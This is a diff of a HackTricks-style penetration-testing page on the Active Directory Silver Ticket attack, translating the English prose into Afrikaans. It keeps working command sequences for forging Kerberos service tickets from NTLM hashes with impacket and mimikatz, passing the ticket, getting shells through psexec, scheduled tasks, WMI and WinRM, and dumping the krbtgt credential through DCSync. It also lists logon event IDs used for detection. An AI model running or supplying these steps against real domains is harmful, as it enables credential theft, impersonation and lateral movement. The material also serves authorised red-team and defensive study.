@@ -4,26 +4,23 @@
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug bounty tip**: **meld aan** by **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin verdien bounties tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+Die **Silver Ticket** aanval behels die uitbuiting van dienskaartjies in Active Directory (AD) omgewings. Hierdie metode is gebaseer op **die verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **om enige gebruiker na te boots**, tipies met die doel om administratiewe voorregte te verkry. Dit word beklemtoon dat die gebruik van AES-sleutels vir die vervalsing van kaartjies veiliger en minder opspoorbaar is.
 
-For ticket crafting, different tools are employed based on the operating system:
+Vir kaartjie-ontwerp word verskillende gereedskap gebruik, gebaseer op die bedryfstelsel:
 
 ### On Linux
-
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
-### On Windows
-
+### Op Windows
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -35,56 +32,52 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-vrae.
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+## Beskikbare Dienste
 
-## Available Services
+| Diens Tipe                                 | Diens Silver Tickets                                                      |
+| ------------------------------------------ | ------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangende van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
+| Geplande Take                              | HOST                                                                    |
+| Windows Lêer Deel, ook psexec             | CIFS                                                                    |
+| LDAP operasies, ingesluit DCSync          | LDAP                                                                    |
+| Windows Remote Server Administrasie Gereedskap | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
+| Goue Tickets                               | krbtgt                                                                |
 
-| Service Type                               | Service Silver Tickets                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
-
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Met **Rubeus** kan jy **vra vir al** hierdie kaarte met die parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Silver tickets Gebeurtenis ID's
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
+- 4624: Rekening Aanmelding
+- 4634: Rekening Afmelding
+- 4672: Admin Aanmelding
 
-## Abusing Service tickets
+## Misbruik van Diens kaarte
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+In die volgende voorbeelde kom ons veronderstel dat die kaart verkry is deur die administrateurrekening te verpersoonlik.
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+Met hierdie kaart sal jy in staat wees om toegang te verkry tot die `C$` en `ADMIN$` gids via **SMB** (as hulle blootgestel is) en lêers na 'n deel van die afstand lêerstelsel te kopieer deur net iets soos te doen:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+U sal ook in staat wees om 'n shell binne die gasheer te verkry of arbitrêre opdragte uit te voer met behulp van **psexec**:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### HOST
+### GASHER
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+Met hierdie toestemming kan jy geskeduleerde take in afstandrekenaars genereer en arbitrêre opdragte uitvoer:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -96,11 +89,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+Met hierdie kaartjies kan jy **WMI in die slagoffer se stelsel uitvoer**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,8 +101,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
-Find **more information about wmiexec** in the following page:
+Vind **meer inligting oor wmiexec** in die volgende bladsy:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -119,32 +109,28 @@ Find **more information about wmiexec** in the following page:
 
 ### HOST + WSMAN (WINRM)
 
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+Met winrm toegang oor 'n rekenaar kan jy **dit toegang** en selfs 'n PowerShell kry:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+Kontrollere die volgende bladsy om **meer maniere te leer om met 'n afstandsbediener te verbind met winrm**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Note that **winrm must be active and listening** on the remote computer to access it.
+> Let daarop dat **winrm aktief en luisterend moet wees** op die afstandsrekenaar om toegang te verkry.
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+**Leer meer oor DCSync** in die volgende bladsy:
 
-**Learn more about DCSync** in the following page:
-
-## References
+## Verwysings
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
@@ -155,9 +141,8 @@ dcsync.md
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug bounty wenk**: **meld aan** by **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien bounties tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
